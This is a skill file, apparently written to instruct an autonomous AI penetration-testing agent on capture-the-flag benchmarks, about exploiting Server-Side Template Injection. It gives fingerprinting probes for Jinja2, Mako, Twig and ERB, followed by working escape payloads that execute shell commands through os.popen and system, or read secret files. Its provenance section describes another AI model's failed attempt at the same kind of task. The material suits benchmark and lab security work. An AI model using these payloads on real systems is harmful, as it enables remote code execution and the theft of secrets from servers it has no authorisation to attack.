# Skill: SSTI engine-fingerprint-then-escape

Vulnerability class: Server-Side Template Injection (RCE-template).

> **NOT a benchmark recipe.** This skill is class-level technique
> knowledge. It must apply equally to any unknown app whose request
> graph contains the class signature below. If you find yourself
> wanting to write "for XBEN-XXX" or "the flag is in /path", stop —
> that violates `feedback_no_prescriptive_recipes`.

## Class signature

A route matches this class when ALL of the following hold:

1. **Code path**: an `engine.from_string(...)` / `render_template_string(...)`
   / `Mako.Template(...)` / `Twig.compile(...)` / `ERB.new(...)` call
   with a user-controlled input string-concatenated into its argument.
2. **CPG hint**: the `pre-recon-cpg-deliverable.md` lists this call
   under `TEMPLATE_SINKS` with the file:lineno location.
3. **Colocated secret**: a `FILE_SINKS` entry (or hardcoded secret path)
   exists in the same file or sibling module. Without a target to
   exfiltrate, the SSTI is informational only.

If any of (1)-(3) is missing this is NOT the right class — pivot.

## Why this class is high-confidence when CPG flags it

`engine.from_string + request.GET.get` (or its framework equivalent)
is the canonical SSTI primitive. The CPG taint trace eliminates
ambiguity: the dataflow path from user input to the template compile
call is proven, not heuristic. Once confirmed, the only remaining
question is WHICH engine, because the escape payload is engine-specific.

## Phase A — engine fingerprint (max 4 requests)

The skill MUST identify the engine before attempting any escape, because
each engine has a different sandbox model and different bypass.

Probe the user-controlled value with each of:

```
{{7*7}}            ← Jinja2 / Django-template (sometimes)
${7*7}             ← Mako
<%= 7*7 %>         ← ERB
{%print 7*7%}      ← Twig
```

Success criterion: the literal string `49` appears in the response
body. The expression that wins identifies the engine.

If `{{7*7}}` returns echoed-back `{{7*7}}` (not `49`), the engine is
Django-stock (no expression evaluation). In that case the route is
likely informational-only via SSTI — pivot to the colocated FILE_SINKS
class instead, do NOT continue mutating SSTI payloads against an
inert engine.

## Phase B — engine-specific escape (max 6 requests)

Engine-locked. Substitute `$SECRET_PATH` from the colocated FILE_SINKS
entry surfaced by CPG — read it at runtime from the deliverable, never
hard-code.

### Jinja2
```
{{config.__class__.__init__.__globals__['os'].popen('cat $SECRET_PATH').read()}}
```
Fallback when `config` is unavailable:
```
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('cat $SECRET_PATH').read()}}
```
Iterate `N` over the subclasses index until one with `os` in its
globals lands.

### Mako
```
${ self.module.cache.util.os.popen('cat $SECRET_PATH').read() }
```

### Twig
```
{{['cat $SECRET_PATH']|filter('system')}}
```

### ERB
```
<%= IO.read('$SECRET_PATH') %>
```

## Mutation strategy across both phases

After each Phase B request:

1. Regex the response body for `flag\{...\}` or `xbow-[a-f0-9]+` BEFORE
   calling any emit helper. Store the matched bytes in a local variable.
2. Print `AEGISPT_FINDING:` JSON on stdout FIRST (belt-and-braces), THEN
   call the runner's emit helper. A kwarg-typo in the emit call must
   not eat the proof.
3. Exit 0 with a diagnostic JSON line if no engine fingerprinted or
   no flag matched.

## Stop conditions

- 10 requests total used.
- Engine fingerprinted as Django-stock (no eval) → pivot to FILE_SINKS.
- Flag pattern matched → emit + exit 0.
- Phase A returned no engine signal across all 4 probes → not SSTI
  after all, mark `{"ssti": "no-engine-detected"}` and exit 0.

## What this skill is NOT

- Not a benchmark answer key. If this file ever names XBEN ids, flags,
  app names, or specific URLs, it has degenerated into solution caching
  and must be reverted.
- Not a generic SSTI scanner. The skill assumes CPG has already
  identified the sink + secret path. Black-box discovery of SSTI is
  a different skill (Phase A becomes the whole flow against every form
  input on every observed page, with vastly worse efficiency).

## Provenance

Format inspired by transilienceai/communitytools (MIT). Content derived
from diagnose-no-flag forensic analysis of smoke 50 (XBEN-009-24,
2026-05-27) where Gemini correctly identified the SSTI primitive but
attempted blind context-variable lookups instead of engine fingerprint,
then crashed on a kwarg-typo even when the escape payload was correct.
